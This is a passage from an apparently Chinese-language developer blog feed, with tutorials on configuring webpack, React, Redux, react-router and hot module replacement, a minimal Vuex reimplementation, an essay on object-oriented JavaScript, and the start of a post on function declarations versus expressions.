&#125;&#125;);return entryMap;</code></pre><p>}<br />{<br />…<br />entry: getEntry()<br />…<br />}<br />本demo采用的是第二中写法，能够更加灵活。</p><p>如何理解entry point(bundle),chunk,module</p><p>在webpack中，如何理解entry point(bundle),chunk,module?先看看下图：</p><p>根据图上的表述，我这里简单说一下结论：</p><p>配置中每个文件例如index1.js,index2.js,detail.js,home.js都属于entry point.<br />entry这个配置中，每个key值,index,detail,home都相当于chunk。<br />我们在代码中的require或者import的都属于module，这点很好理解。<br />chunk的分类比较特别，有entry chunk,initial chunk,normal chunk,参考这个文章<br />正常情况下，一个chunk对应一个output,在使用了CommonsChunkPlugin或者require.ensure之后，chunk就变成了initial chunk,normal chunk，这时，一个chunk对应多个output。</p><p>理解这些概念对于后续使用webpack插件有很大的帮助。<br />多入口页面html配置</p><p>之前我们配置HtmlWebpackPlugin时，同样采用的是但页面的配置，这里我们将进行多页面改造,entryMap是上一步得到的entry：</p><p>function htmlAarray(entryMap) {<br />let htmlAarray = [];</p><pre><code>Object.keys(entryMap).forEach(function(key)&#123;    let fullPathName = path.resolve(pageDir, key);    let fileName = path.resolve(fullPathName, key + '.html')    if (fs.existsSync(fileName)) &#123;        htmlAarray.push(new HtmlWebpackPlugin(&#123;            chunks: key, // 注意这里的key就是chunk            filename: key + '.html',            template: fileName,            inlineSource:  '.(js|css)'        &#125;))    &#125;&#125;);return htmlAarray;</code></pre><p>}<br />修改plugin配置：</p><p>plugins: [<br />…<br />].concat(htmlMap)<br />redux</p><p>关于redux的使用可以参考阮一峰老师的入门教程</p><p>安装redux<br />redux<br />react-redux<br />npm install redux react-redux --save<br />新建reducers，actions目录和文件<br />|—— index/<br />|—— Main/                   * 组件代码<br />|       |—— Main.jsx        * 组件jsx<br />|       |—— Main.scss       * 组件css<br />|<br />|—— actions/<br />|       |—— actionTypes.js  * action常量<br />|       |—— todoAction.js   * action<br />|<br />|—— reducers/<br />|       |—— todoReducer.js  * reducer<br />|       |—— main.js         * 将所有reducer进行combin，store.js只引入这个<br />|<br />|—— store.js<br />|<br />|—— index.js</p><p>修改代码，引入redux,这里以一个redux todo为demo例子：<br />index.js</p><p>import ReactDom from ‘react-dom’;<br />import React from ‘react’;<br />import Main from ‘./Main/Main.jsx’;<br />import store from ‘./store.js’;<br />import { Provider } from ‘react-redux’;</p><p>ReactDom.render(<br /><Provider store={store}><br /><Main /><br /></Provider><br />, document.getElementById(‘root’));<br />store.js</p><p>import { createStore } from ‘redux’;<br />import todoReducer from ‘./reducers/todoReducer.js’;</p><p>const store = createStore(todoReducer);</p><p>export default store;<br />tabReducer.js</p><p>import { ADD_TODO } from ‘…/actions/actionTypes.js’;</p><p>const initialState = {<br />todoList: []<br />};</p><p>const addTodo = (state, action) =&gt; {</p><p>return { …state, todoList: state.todoList.concat(action.obj) }<br />}</p><p>const todoReducer = (state = initialState, action) =&gt; {<br />switch(action.type) {<br />case ADD_TODO: return addTodo(state, action);<br />default: return state;<br />}<br />};<br />export default todoReducer;<br />Main.jsx</p><p>import React from ‘react’;<br />import { connect } from ‘react-redux’;<br />import { addTodo } from ‘…/actions/todoAction.js’;</p><p>class Main extends React.Component {</p><pre><code>onClick()&#123;    let text = this.refs.input;    this.props.dispatch(addTodo(&#123;        text: text.value    &#125;))&#125;render() &#123;    return (        &lt;div&gt;            &lt;input ref=&quot;input&quot; type=&quot;text&quot;&gt;&lt;/input&gt;            &lt;button onClick=&#123;()=&gt;this.onClick()&#125;&gt;提交&lt;/button&gt;            &lt;ul&gt;            &#123;this.props.todoList.map((item, index)=&gt;&#123;                return &lt;li key=&#123;index&#125;&gt;&#123;item.text&#125;&lt;/li&gt;            &#125;)&#125;            &lt;/ul&gt;        &lt;/div&gt;    );&#125;</code></pre><p>}</p><p>export default connect(<br />state =&gt; ({<br />todoList: state.todoList<br />})<br />)(Main);<br />todoAction.js</p><p>import { ADD_TODO } from ‘./actionTypes.js’;</p><p>export const addTodo = (obj) =&gt; {<br />return {<br />type: ADD_TODO,<br />obj: obj<br />};<br />};<br />使用react-router</p><p>react-router强大指出在于方便代码管理，结合redux使用更加强大，同时支持web，native更多参考这里</p><p>安装react-router-dom<br />npm install react-router-dom --save<br />如果项目中用了redux，可以安装connected-react-router<br />npm install connected-react-router history --save</p><p>修改代码：</p><p>index.js:<br />import ReactDom from ‘react-dom’;<br />import React from ‘react’;<br />import Container from ‘./Main/Container.jsx’;<br />import { store, history } from ‘./store.js’;</p><p>import { Provider } from ‘react-redux’;</p><p>import { ConnectedRouter } from ‘connected-react-router’;</p><p>ReactDom.render(<br /><Provider store={store}><br /><ConnectedRouter history={history}><br /><Container /><br /></ConnectedRouter><br /></Provider><br />, document.getElementById(‘root’));<br />结合history,react-router一共有3中不同的router：</p><p>BrowserRouter通过history/createBrowserHistory引入:当切换时，url会动态更新，底层使用的时html5的pushState。<br />HashRouter通过history/createHashHistory引入:当切换时，动态修改hash，利用hashchange事件。<br />MemoryRouter通过history/createMemoryHistory引入:将路径，路由相关数据存入内存中，不涉及url相关更新，兼容性好。<br />更多配置可以参考这里</p><p>如果想要在代码逻辑中获取当前的route的location信息需要在main.js中添加router的reducer:</p><p>新建main.js:<br />import { combineReducers } from ‘redux’;<br />import { connectRouter } from ‘connected-react-router’<br />import todoReducer from ‘./todoReducer.js’;</p><p>const reducers = (history) =&gt; combineReducers({<br />todoReducer,<br />router: connectRouter(history)<br />});<br />export default reducers;<br />编写store.js:</p><p>import { createStore } from ‘redux’;<br />import mainReducer from ‘./reducers/main.js’;<br />import createHistory from ‘history/createHashHistory’;</p><p>export const history = createHistory();</p><p>const store = createStore(<br />createRootReducer(history),<br />);</p><p>export default store;<br />然后就可以在this.props.router里面获取到相关的location路径信息，其实就是将router对象放在组件的props里面。</p><p>如果需要自己通过dispatch一个action来触发router的跳转，需要引入routerMiddleware:<br />import { createStore,applyMiddleware,compose } from ‘redux’;<br />import mainReducer from ‘./reducers/main.js’;<br />import createHistory from ‘history/createHashHistory’;<br />import { routerMiddleware } from “connected-react-router”;</p><p>export const history = createHistory();</p><p>const store = createStore(<br />createRootReducer(history),<br />compose(applyMiddleware(routerMiddleware(history)))<br />);</p><p>export default store;<br />最后，将改动同步在index.js长这样：</p><p>index.js:</p><p>import ReactDom from ‘react-dom’;<br />import React from ‘react’;<br />import Container from ‘./Main/Container.jsx’;<br />import store, { history } from ‘./store.js’;</p><p>import { Provider } from ‘react-redux’;</p><p>import { ConnectedRouter } from ‘connected-react-router’;</p><p>ReactDom.render(<br /><Provider store={store}><br /><ConnectedRouter history={history}><br /><Container /><br /></ConnectedRouter><br /></Provider><br />, document.getElementById(‘root’));<br />看到这里，大家可能会对react-router，react-router-dom，connected-react-router，history这些东西给搞晕了，在这里解释一下：</p><p>react-router：是react-router的核心逻辑，并不涉及到UI，必须引入。<br />react-router-dom：是react-router的DOM绑定模块，只有用了react-router-dom才能用类似,这些组件，必须引入。<br />history：是一个让你灵活控制或者模拟浏览器的历史操作的一个库，包括BrowserHistory，HashHistory，MemoryHistory，他可以脱离React使用，也可以结合React使用，可选引入。<br />connected-react-router：简单来说就是你的项目如果用的React和Redux，如果想要用router的话就可以引入connected-react-router，它能帮你把router的状态放在store里来管理(注意根据你使用的react-router版本不同，会使用不同的版本，它的前身是react-router-redux，官方已经不再维护了)，可选引入。<br />使用Route和Link和withRouter:</p><p>先说说都是干嘛的：<br />Route:component里面的内容即是tab的主要内容，这个从react-router4开始生效：<br /><Route exact path="/" component={Div1}></Route><br /><Route path="/2" component={Div2}></Route><br />Link:通常也可以用NavLink，相当于tab按钮，控制router的切换,activeClass表示当前tab处于激活态时应用上的class。<br />withRouter:如果你用了redux，那么你一定要引入它。<br />export default withRouter(connect(<br />state =&gt; ({<br />todoList: state.todoReducer.todoList<br />})<br />)(Main));<br />如果你在使用hash时遇到Warning: Hash history cannot PUSH the same path; a new entry will not be added to the history stack错误，可以将push改为replace即</p><p><NavLink    replace={true}    to="/2"    activeClassName="selected"    >切换到2号</NavLink><br />设置初始化路由：<br />BrowserRouter和HashRouter:<br />const history = createHistory();<br />history.push(‘2’);<br />MemoryRouter:<br />const history = createMemoryHistory({<br />initialEntries: [‘/2’]<br />});<br />使用redux-thunk</p><p>redux-thunk 是一个比较流行的 redux 异步 action 中间件，比如 action 中有 setTimeout 或者通过 fetch通用远程 API 这些场景，那么久应该使用 redux-thunk 了。redux-thunk 帮助你统一了异步和同步 action 的调用方式，把异步过程放在 action 级别解决，对 component 没有影响。</p><p>安装redux-thunk:<br />npm install redux-thunk --save<br />修改store.js:<br />import { createStore,applyMiddleware } from ‘redux’;<br />import thunk from ‘redux-thunk’;<br />import mainReducer from ‘./reducers/main’;<br />…<br />const store = createStore(mainReducer, applyMiddleware(thunk));<br />…<br />export default store;</p><p>在action.js使用redux-thunk：<br />export const getData = (obj) =&gt; (dispatch, getState) =&gt; {<br />setTimeout(()=&gt;{<br />dispatch({<br />type: GET_DATA,<br />obj: obj<br />});<br />},1000);<br />};<br />模块热替换（Hot Module Replacement）</p><p>模块热替换(Hot Module Replacement 或 HMR)是 webpack 提供的最有用的功能之一。它允许在运行时更新各种模块，而无需进行完全刷新,很高大上有木有！</p><p>下面说一下配置方法，它需要结合devServer使用：</p><p>devServer: {<br />hot: true // 开启HMR<br />},<br />开启plugin：</p><p>const webpack = require(‘webpack’);<br />plugins: [<br />new webpack.NamedModulesPlugin(),<br />new webpack.HotModuleReplacementPlugin(),<br />].concat(htmlMap)<br />结合React一起使用：</p><p>安装react-hot-loader,<br />npm install react-hot-loader --save<br />并新建一个Container.jsx:</p><p>import React from ‘react’;<br />import Main from ‘./Main.jsx’;<br />import { hot } from ‘react-hot-loader’</p><p>class Container extends React.Component {</p><pre><code>render() &#123;    return &lt;Main /&gt;&#125;</code></pre><p>}<br />export default hot(module)(Container);<br />结合redux：如果项目没有使用redux，可以无需配置后面2步</p><ol start="2"><li>修改store.js新增下面代码，为了让reducer也能实时热替换</li></ol><p>if (module.hot) {<br />module.hot.accept(‘./reducers/todoReducer.js’, () =&gt; {<br />const nextRootReducer = require(‘./reducers/todoReducer.js’).default;<br />store.replaceReducer(nextRootReducer);<br />});<br />}</p><p>修改index.js<br />import ReactDom from ‘react-dom’;<br />import React from ‘react’;<br />import Container from ‘./Main/Container.jsx’;<br />import store from ‘./store.js’;</p><p>import { Provider } from ‘react-redux’;</p><p>ReactDom.render(<br /><Provider store={store}><br /><Container /><br /></Provider><br />, document.getElementById(‘root’));<br />当控制台看到[WDS] Hot Module Replacement enabled.代表开启成功</p><p>使用ESLint</p><p>ESLint 是众多 Javascript Linter 中的其中一种，其他比较常见的还有 JSLint 跟 JSHint，之所以用 ESLint 是因为他可以自由选择要使用哪些规则，也有很多现成的 plugin 可以使用，另外他对 ES6 还有 JSX 的支持程度跟其他 linter 相比之下也是最高的。</p><p>安装ESLint<br />npm install eslint eslint-loader babel-eslint --save<br />其中eslint-loader是将webpack和eslint结合起来在webpack的配置文件中新增一个eslint-loader种，修改如下</p><p>{ test: /.(js|jsx)$/, use: [{loader:‘babel-loader’},{loader:‘eslint-loader’}] ,include: path.resolve(srcRoot)},<br />新建.eslintrc配置文件,将parser配置成babel-eslint<br />{<br />“extends”: [“eslint:recommended”],</p><pre><code>&quot;parser&quot;: &quot;babel-eslint&quot;,&quot;globals&quot;: &#123;&#125;,&quot;rules&quot;: &#123;&#125;</code></pre><p>}<br />安装eslint-plugin-react:<br />npm install eslint-plugin-react --save<br />说明一下，正常情况下每个eslint规则都是需要在rule下面配置，如果什么都不配置，其实本身eslint是不生效的。<br />eslint本身有很多默认的规则模版，可以通过extends来配置，默认可以使用eslint:recommended。<br />在使用react开发时可以安装eslint-plugin-react来告知使用react专用的规则来lint<br />修改.eslintrc配置文件,增加rules，更多rules配置可以参考这里<br />{<br />“extends”: [“eslint:recommended”,“plugin:react/recommended”],</p><pre><code>&quot;parser&quot;: &quot;babel-eslint&quot;,&quot;globals&quot;: &#123;    &quot;window&quot;: true,    &quot;document&quot;: true,    &quot;module&quot;: true,    &quot;require&quot;: true&#125;,&quot;rules&quot;: &#123;    &quot;react/prop-types&quot; : &quot;off&quot;,    &quot;no-console&quot; : &quot;off&quot;&#125;</code></pre><p>}<br />使用axios和async/await</p><p>axios 是一个基于Promise 用于浏览器和 nodejs 的 HTTP 客户端：</p><p>从浏览器中创建 XMLHttpRequest<br />从 node.js 发出 http 请求<br />支持 Promise API<br />自动转换JSON数据<br />安装axios:<br />npm install axios --save<br />在action中使用axios：<br />import axios from ‘axios’;<br />export const getData = (obj) =&gt; (dispatch, getState) =&gt; {<br />axios.get(‘/json/comments.json’).then((resp)=&gt;{<br />dispatch({<br />type: GET_DATA,<br />obj: resp<br />});<br />});<br />};<br />async/await：</p><p>Javascript的回调地狱，相信很多人都知道，尤其是在node端，近些年比较流行的是Promise的解决方案，但是随着 Node 7 的发布，编程终级解决方案的 async/await应声而出。</p><p>function resolveAfter2Seconds() {<br />return new Promise(resolve =&gt; {<br />setTimeout(() =&gt; {<br />resolve(‘resolved’);<br />}, 2000);<br />});<br />}</p><p>async function asyncCall() {<br />var result = await resolveAfter2Seconds();<br />}</p><p>asyncCall();<br />async/await的用途是简化使用 promises 异步调用的操作，并对一组 Promises执行某些操作。await前提是方法返回的是一个Promise对象，正如Promises类似于结构化回调，async/await类似于组合生成器和 promises。</p><p>async/await需要安装babel-plugin-transform-async-to-generator。<br />npm install babel-plugin-transform-async-to-generator --save<br />在.babelrc中增加配置：<br />“plugins”: [<br />“transform-async-to-generator”<br />]<br />这样做仅仅是将async转换generator，如果你当前的浏览器不支持generator，你将会收到一个Uncaught ReferenceError: regeneratorRuntime is not defined的错误，你需要：</p><ol start="3"><li>安装babel-plugin-transform-runtime:</li></ol><p>npm install babel-plugin-transform-async-to-generator --save<br />修改.babelrc中的配置(可以去掉之前配置的transform-async-to-generator)：<br />“plugins”: [<br />“transform-runtime”<br />]<br />如果不想引入所有的polyfill(参考上面对babel的解释),可以增加配置：<br />“plugins”: [<br />“transform-runtime”,<br />{<br />“polyfill”: false,</p><pre><code>            &quot;regenerator&quot;: true,        &#125;]</code></pre><p>结合axios使用：<br />import axios from ‘axios’;<br />export const getData = (obj) =&gt; async (dispatch, getState) =&gt; {<br />let resp = axios.get(‘/json/comments.json’);<br />dispatch({<br />type: GET_DATA,<br />obj: resp<br />});<br />};<br />Code Splitting</p><p>对于webpack1，2之前，你可以使用require.ensure来控制一个组件的懒加载：<br />require.ensure([], _require =&gt; {<br />let Component = _require(‘./Component.jsx’);<br />},‘lazyname’)<br />在webpack4中，官方已经不再推荐使用require.ensure来使用懒加载功能Dynamic Imports，取而代之的是ES6的import()方法：<br />import(<br />/* webpackChunkName: “my-chunk-name” <em>/<br />/</em> webpackMode: “lazy” */<br />‘module’<br />);<br />不小小看注释里的代码，webpack在打包时会动态识别这里的代码来做相关的配置，例如chunk name等等。<br />3. Prefetching/Preloading modules:</p><p>webpack 4.6.0+支持了Prefetching/Preloading的写法:</p><p>//…<br />import(/* webpackPreload: true */ ‘ChartingLibrary’);<br />结合React-Router使用:<br />react-loadable对上述的功能做了封装，丰富了一些功能，结合React-Router起来使用更加方便。</p><p>npm install react-loadable --save<br />在react-router里使用：</p><p>function Loading() {<br />return <div>Loading…</div>;<br />}</p><p>let Div2 = Loadable({<br />loader: () =&gt; import(‘./Div2’),<br />loading: Loading,<br />});</p><p><Route path="/2" component={Div2}></Route><br />使用CommonsChunkPlugin</p><p>CommonsChunkPlugin 插件，是一个可选的用于建立一个独立文件(又称作 chunk)的功能，这个文件包括多个入口 chunk 的公共模块。通过将公共模块拆出来，最终合成的文件能够在最开始的时候加载一次，便存起来到缓存中供后续使用。</p><p>在webpack4之前的用法：<br />new webpack.optimize.CommonsChunkPlugin({<br />name: ‘common’,<br />chunks: [‘page1’,‘page2’],<br />minChunks: 3<br />})<br />name: string: 提出出的名称<br />chunks: string[]: webpack会从传入的chunk里面提取公共代码,默认从所有entry里提取<br />minChunks: number|infinity|function(module,count)-&gt;boolean: 如果传入数字或infinity(默认值为3)，就是告诉webpack，只有当模块重复的次数大于等于该数字时，这个模块才会被提取出来。当传入为函数时，所有符合条件的chunk中的模块都会被传入该函数做计算，返回true的模块会被提取到目标chunk。<br />更多的参数配置，可以参考这里<br />在webpack4之后的用法：<br />module.exports = {<br />//…<br />optimization: {<br />splitChunks: {<br />chunks: ‘async’,<br />minSize: 30000,<br />minChunks: 1,<br />maxAsyncRequests: 5,<br />maxInitialRequests: 3,<br />automaticNameDelimiter: ‘~’,<br />name: true,<br />cacheGroups: {<br />vendors: {<br />test: /[\/]node_modules[\/]/,<br />priority: -10<br />},<br />default: {<br />minChunks: 2,<br />priority: -20,<br />reuseExistingChunk: true<br />}<br />}<br />}<br />}<br />};<br />splitChunks: 配置一个分离chunk(代替老版本的CommonsChunkPlugin)<br />cacheGroups: 自定义配置主要使用它来决定生成的文件:<br />test: 限制范围<br />name: 生成文件名<br />priority: 优先级<br />minSize: number: 最小尺寸必须大于此值，默认30000B<br />minChunks: 其他entry引用次数大于此值，默认1<br />maxInitialRequests: entry文件请求的chunks不应该超过此值（请求过多，耗时）<br />maxAsyncRequests: 异步请求的chunks不应该超过此值<br />automaticNameDelimiter: 自动命名连接符<br />chunks: 值为&quot;initial&quot;, “async”（默认） 或 “all”:<br />initial: 入口chunk，对于异步导入的文件不处理<br />async: 异步chunk，只对异步导入的文件处理<br />all: 全部chunk</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;前端工程化至上&lt;/p&gt;
&lt;p&gt;目录&lt;/p&gt;
&lt;p&gt;版本说明&lt;br /&gt;
目录结构&lt;br /&gt;
初始化项目&lt;br /&gt;
webpack&lt;br /&gt;
react&lt;br /&gt;
配置loader(sass,jsx)&lt;br /&gt;
引入babel&lt;br /&gt;
使用HtmlWebpack</summary>
      
    
    
    
    
    <category term="实践" scheme="https://harrypangpang.github.io/tags/%E5%AE%9E%E8%B7%B5/"/>
    
  </entry>
  
  <entry>
    <title>vuex简单版学习</title>
    <link href="https://harrypangpang.github.io/2021/01/14/vuex%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/"/>
    <id>https://harrypangpang.github.io/2021/01/14/vuex%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/</id>
    <published>2021-01-14T06:06:45.000Z</published>
    <updated>2023-02-23T03:30:13.097Z</updated>
    
    <content type="html"><![CDATA[<h3 id="vuex简单版学习"><a class="markdownIt-Anchor" href="#vuex简单版学习"></a> vuex简单版学习</h3><pre><code class="hljs plaintext">let Vue;class Store &#123;  constructor(options) &#123;    //实现data的双向绑定    this.state = new Vue(&#123;      data: options.state    &#125;);    this.mutations = options.mutations;    this.actions = options.actions;    options.getters &amp;&amp; this.handleGetters(options.getters);  &#125;  commit = (type, arg) =&gt; &#123;    this.mutations[type](this.state, arg);  &#125;;  dispatch(type, arg) &#123;    this.actions[type](      &#123;        state: this.state,        commit: this.commit      &#125;,      arg    );  &#125;  handleGetters(getters) &#123;    this.getters = &#123;&#125;; // 定义this.getters    // 遍历getters选项，为this.getters定义property // 属性名就是选项中的key，只需定义get函数保证其只读性    Object.keys(getters).forEach(key =&gt; &#123;      // 这样这些属性都是只读的      Object.defineProperty(this.getters, key, &#123;        get: () =&gt; &#123;          // 注意依然是箭头函数          return getters[key](this.state);        &#125;      &#125;);    &#125;);  &#125;&#125;function install(_Vue) &#123;  Vue = _Vue;  Vue.mixin(&#123;    // 生命周期    beforeCreate() &#123;      // 获取new Vue里的store      Vue.prototype.$store = this.$options.store;    &#125;  &#125;);&#125;export default &#123;  Store,  install&#125;;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;vuex简单版学习&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#vuex简单版学习&quot;&gt;&lt;/a&gt; vuex简单版学习&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;hljs plaintext&quot;&gt;let Vue;
class Store</summary>
      
    
    
    
    
    <category term="源码" scheme="https://harrypangpang.github.io/tags/%E6%BA%90%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>是时候谈谈JavaScript面向对象了</title>
    <link href="https://harrypangpang.github.io/2019/05/14/%E6%98%AF%E6%97%B6%E5%80%99%E8%B0%88%E8%B0%88JavaScript%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E4%BA%86/"/>
    <id>https://harrypangpang.github.io/2019/05/14/%E6%98%AF%E6%97%B6%E5%80%99%E8%B0%88%E8%B0%88JavaScript%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E4%BA%86/</id>
    <published>2019-05-14T08:05:19.000Z</published>
    <updated>2023-02-23T03:30:13.100Z</updated>
    
    <content type="html"><![CDATA[<p>前端技术尤其是JavaScript，经常被后端觉得不是正经编程语言，大多数是因为JavaScript是基于函数的语言，因此潜在上使得它在使用和发展上有所局限。</p><p>我记得在90年代末和21世纪初，JavaScript主要用于使html页面更加动态。比如实现一些弹窗，跑马灯之类的视觉效果。</p><p>现在，我们有很多框架，库，甚至后端系统都在使用JavaScript。用JavaScript开发一个移动应用和桌面应用程序-在以前是闻所未闻的，但如今，这些我们经常听说甚至已经投入使用了。现在我们还可以用JavaScript实现跨平台开发！</p><p>JavaScript无处不在，你可以使用JavaScript轻松完成很多有趣的东西。但随之而来的是潜在的长期问题。许多JavaScript开发者并没有像java开发者一样习惯使用面向对象编程，或者说没有面向对象编程这方面的训练。这很正常，因为我们经常为了追赶进度完成手头的工作，忽略了一些我们还不知道的内容</p><h3 id="什么是面向对象编程"><a class="markdownIt-Anchor" href="#什么是面向对象编程"></a> 什么是面向对象编程？</h3><p>面向对象的编程是一种思想，一种心态。它背后的想法是，你为你想象中的对象创建了一个蓝图，然后一次又一次地调用它来完成各种各样的功能。每次你想使用一个对象时，你必须先创建它这样它才会存在，然后设置它的属性，以便使用附加到它的功能。这些功能被称为“方法”。</p><p>例如，一个CustomerOrder对象可能附加了一个GET：Order Details功能(又名方法)。</p><pre><code class="hljs plaintext">//基于类class CustomerOrder&#123;  constructor(customerId,orderId)&#123;    this.customerId = customerId;    this.orderId = orderId  &#125;  get orderDetails()&#123;    return this.pullOrderDetails();  &#125;  pullOrderDetails()&#123;    //一些操作    return   &#125;&#125;const order_1 = new CustomerOrder(87873,&quot;Cus-001&quot;)console.log(order_1.orderDetails)</code></pre><p>我们来看另一个基于函数的方法：</p><pre><code class="hljs plaintext">//基于函数const customerId = 8787const orderId = &quot;Cus-001&quot;function pullOrderDetails(customerId,orderId)&#123;  //一些操作  return&#125;console.log(pullOrderDetails(87873,&quot;Cus-001&quot;))</code></pre><p>上面的问题在于，函数的数量多起来时，很快就会变得混乱。虽然将所有内容都编写为函数，然后根据需要来调用，在一开始可能会很方便，但是日积月累，函数之间的关联关系错综复杂，一旦发生变更，你可能需要修改很多函数，也会引起很多未知问题。</p><p>可能有些难理解，我们看下面的图（使用类的情况）：</p><p><img src="https://user-gold-cdn.xitu.io/2019/5/14/16ab412a436cc03d?w=707&amp;h=431&amp;f=png&amp;s=76202" alt="" /></p><p>constructor是设置变量的地方，Getter和setter方法是类做事的入口。使用什么函数以及如何使用它们都是隐藏的。每次创建一个新对象时，整个类及其方法都会被“克隆”，并可访问需要的内容。发生变更时，我们也只需要在类上一次修改，便可以全局生效。</p><p>我们再看下面的图（使用函数的情况）</p><p><img src="https://user-gold-cdn.xitu.io/2019/5/14/16ab41e84a261066?w=514&amp;h=557&amp;f=png&amp;s=100265" alt="" /></p><p>当我们用一堆松散的函数编写代码时，它的更改范围通常没有定义。依赖项注入是使函数正常工作所必需的，而一个函数常常需要另一个函数才能正常工作。从表面上看，基于函数的编程可能一开始看起来很简单，但从长远来看，维护它是一个逻辑上的噩梦。</p><p>使用面向对象编程，您只需要调用getter和setter方法来访问黑盒功能。作为类的消费者，你不需要知道它是如何工作的。你只需要知道它是有效的。</p><h3 id="为什么我们要在javascript中采用面向对象编程"><a class="markdownIt-Anchor" href="#为什么我们要在javascript中采用面向对象编程"></a> 为什么我们要在JavaScript中采用面向对象编程</h3><p>上面的两幅图能看出来，过度依赖基于函数的编程可能很快就能完成任务，但是长远来看，这会存在很高的风险。</p><p>随着代码量的增长，你就需要改变组织代码的思维方式，并考虑采用面向对象。与通过一系列依赖注入串在一起的函数相比，对象的则更容易追踪和掌握。</p><p>下面的代码是基于函数：<br /><img src="https://user-gold-cdn.xitu.io/2019/5/14/16ab43201df8f7ec?w=659&amp;h=663&amp;f=png&amp;s=375922" alt="" /><br />你会需要知道整个调用链，以便弄清楚如何实现你的目的。当然也很乱，不易理解。</p><p>基于函数的编程的问题是，链的中断可能导致整个流程的失败。对于对象，一个被破坏的方法不会(也不应该)影响类的其他部分。</p><p>下面的代码是基于类（面向对象）：<br /><img src="https://user-gold-cdn.xitu.io/2019/5/14/16ab434d086a85ce?w=622&amp;h=661&amp;f=png&amp;s=312815" alt="" /></p><p>这种方法，可能代码量不会少多少，但你可以复用它，而不需要写很长的调用链。</p><p>当你思考问题时，是基于类，而不是一系列相互关联的函数时，代码自然会减少出现问题的风险。因为每一次依赖注入都会增加一次潜在错误的可能，而且寻找错误时，也会花费更多的时间和精力。、</p><h3 id="最后"><a class="markdownIt-Anchor" href="#最后"></a> 最后</h3><p>面向对象编程是一种主动的行为，你可以选择使用，也可以选择不使用。随着前端体系的日益庞大，代码量和应用场景也远超于从前，我们更需要思考面向对象编程的重要性。</p><p>面向对象编程的资料：</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/Objects/Object-oriented_JS">https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/Objects/Object-oriented_JS</a></p><p>———————————————————————————————————————————————————</p><p>放学别走！长按二维码关注 【技术人生路】，无偿免费获取前端学习进阶资料，培训实战视频，就业指导等众多福利哦。我相信我们都是爱学习爱进步的呀！</p><p><img src="https://user-gold-cdn.xitu.io/2019/5/10/16aa05e97ba82933?w=258&amp;h=258&amp;f=jpeg&amp;s=28158" alt="" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;前端技术尤其是JavaScript，经常被后端觉得不是正经编程语言，大多数是因为JavaScript是基于函数的语言，因此潜在上使得它在使用和发展上有所局限。&lt;/p&gt;
&lt;p&gt;我记得在90年代末和21世纪初，JavaScript主要用于使html页面更加动态。比如实现一些弹窗</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>函数声明？函数表达式？我该怎么选？！</title>
    <link href="https://harrypangpang.github.io/2019/05/10/%E5%87%BD%E6%95%B0%E5%A3%B0%E6%98%8EVS%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>https://harrypangpang.github.io/2019/05/10/%E5%87%BD%E6%95%B0%E5%A3%B0%E6%98%8EVS%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F/</id>
    <published>2019-05-10T06:48:36.000Z</published>
    <updated>2023-02-23T03:30:13.098Z</updated>
    
    <content type="html"><![CDATA[<p>我们在日常开发中经常使用函数，聪明的你肯定已经用的炉火纯青了。<code>function doStuff（）&#123;&#125;</code>和<code>（）=&gt; &#123;&#125;</code>是我们整天输入的字符。但它们有何不同，为什么使用另一个呢？</p><p>*<strong>注：我们这里用的例子都是JavaScript</strong></p><h3 id="第一个不同名称"><a class="markdownIt-Anchor" href="#第一个不同名称"></a> 第一个不同：名称</h3><p>当你用一个名称创建函数时，这是一个函数声明。在函数表达式中可以省略该名称，使该函数“匿名”。</p><h4 id="函数声明"><a class="markdownIt-Anchor" href="#函数声明"></a> 函数声明：</h4><p><code>function doStuff() &#123;&#125;;</code></p><h4 id="函数函数表达式"><a class="markdownIt-Anchor" href="#函数函数表达式"></a> 函数函数表达式：</h4><p><code>const doStuff = function() &#123;&#125;</code></p><p>日常中我们经常使用ES6创建函数表达式</p><p><code>const doStuff = ()=&#123;&#125;</code></p><h3 id="第二个不同提升"><a class="markdownIt-Anchor" href="#第二个不同提升"></a> 第二个不同：提升</h3><p>提升是指函数和变量的提升，变量声明和函数声明提升至当前作用域的顶端，然后进行接下来的处理。</p><h4 id="函数声明会被提升但函数表达式不会"><a class="markdownIt-Anchor" href="#函数声明会被提升但函数表达式不会"></a> 函数声明会被提升但函数表达式不会。</h4><p>我们可以通过例子来加深理解：</p><pre><code class="hljs plaintext">//函数声明doStuff();function doStuff() &#123; console.log(&#x27;haha&#x27;)&#125;;</code></pre><p>结果：<br /><img src="https://user-gold-cdn.xitu.io/2019/5/10/16aa030f3dd7cd09?w=361&amp;h=103&amp;f=png&amp;s=5972" alt="" /><br />看出来没有任何问题。</p><p>看下一个例子</p><pre><code class="hljs plaintext">//函数表达式doStuff();const doStuff = () =&gt; &#123;console.log(&#x27;haha&#x27;)&#125;;</code></pre><p><img src="https://user-gold-cdn.xitu.io/2019/5/10/16aa0341887f5f31?w=439&amp;h=122&amp;f=png&amp;s=9366" alt="" /></p><p>看，这就报错了。</p><p>函数表达式实际解析的过程是这样的：</p><pre><code class="hljs plaintext">const doStuff;doStuff();doStuff = () =&gt; &#123;console.log(&#x27;haha&#x27;)&#125;;</code></pre><p><em><strong>注：函数声明提升的优先级比变量提升高。</strong></em></p><h4 id="使用函数表达式的情况"><a class="markdownIt-Anchor" href="#使用函数表达式的情况"></a> 使用函数表达式的情况：</h4><p>通过上面两个例子，看起来函数声明在提升方面比函数表达式有用的多。但是在他们两个之间选择的时候应该如何抉择呢？</p><p>调用函数表达式可以避免污染全局环境，因为你不知道你的程序有多少不同的函数，如果你使用函数表达式可能就会覆盖了别人的函数，采用函数表达式，就会避免这些问题。</p><h4 id="立即执行函数iife"><a class="markdownIt-Anchor" 